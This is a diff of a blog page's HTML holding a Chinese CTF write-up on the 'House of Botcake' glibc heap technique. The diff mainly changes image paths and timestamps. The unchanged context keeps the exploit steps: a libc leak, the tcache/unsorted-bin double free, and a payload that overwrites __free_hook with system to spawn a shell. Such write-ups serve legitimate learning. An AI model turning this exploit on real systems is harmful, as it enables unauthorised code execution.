@@ -25,20 +25,20 @@
 <meta property="og:site_name" content="D0wnBe@t">
 <meta property="og:description" content="介绍参考文章  House Of Botcache是用于绕过tcache double free检查的一种方法，在glibc2.29-2.31，对于tcache加入了key值来检测该tcache是否已经存在于tcache bins中，该方法就是借用unsorted bin来绕过double free的检查,下面跟着源码来分析一下。 源码源码文档  tcachekey值的引进  2984行  123">
 <meta property="og:locale" content="zh_CH">
-<meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017112625355.bmp">
-<meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017112740399.bmp">
-<meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017112807185.bmp">
-<meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017112656932.bmp">
-<meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017112828023.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241017112625355.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241017112740399.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241017112807185-1730864904515-24.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241017112656932.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241017112828023.bmp">
 <meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017113852230.bmp">
 <meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017113915339.bmp">
 <meta property="og:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017113934742.bmp">
 <meta property="article:published_time" content="2024-10-17T02:01:56.000Z">
-<meta property="article:modified_time" content="2024-10-17T03:46:21.903Z">
+<meta property="article:modified_time" content="2024-11-06T04:44:38.088Z">
 <meta property="article:author" content="downbeat">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://downbeat.top/House-Of-Botcake/capture_20241017112625355.bmp">
+<meta name="twitter:image" content="http://downbeat.top/capture_20241017112625355.bmp">
     
     
     <!--- Icon Part-->
@@ -245,8 +245,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-10-17 11:46:21</span>
-            <span class="mobile">2024-10-17 11:46:21</span>
+            <span class="desktop">2024-11-06 12:44:38</span>
+            <span class="mobile">2024-11-06 12:44:38</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -361,7 +361,7 @@
 <h2 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h2><p><code>1.填满tcache bin,并泄露libc</code></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意要先add再free，不然add就是取tcache bin中的chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112625355.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112625355.bmp"></p>
 <p>直接show就可以获得__malloc_hook+0x70的地址，达到泄露libc</p>
 <p><code>2.打House Of Botcake</code></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bug()</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># tcache留下空位</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># chunk10</span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># tcahcebin unsortedbin</span></span><br></pre></td></tr></table></figure></div>
@@ -369,16 +369,16 @@
 <ul>
 <li>free(7)</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112740399.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112740399.bmp"></p>
 <ul>
 <li>add(0x80)</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112807185.bmp"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112656932.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112807185-1730864904515-24.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112656932.bmp"></p>
 <ul>
 <li>free(8)进入tcache（unsorted bin先进先出)</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112828023.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241017112828023.bmp"></p>
 <p><code>3.利用edit任意改+double free</code></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(__free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,size(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(system_addr)) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
@@ -414,7 +414,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-10-17 11:46:21
+                    :</strong> 2024-11-06 12:44:38
             </li>
         
         <li>
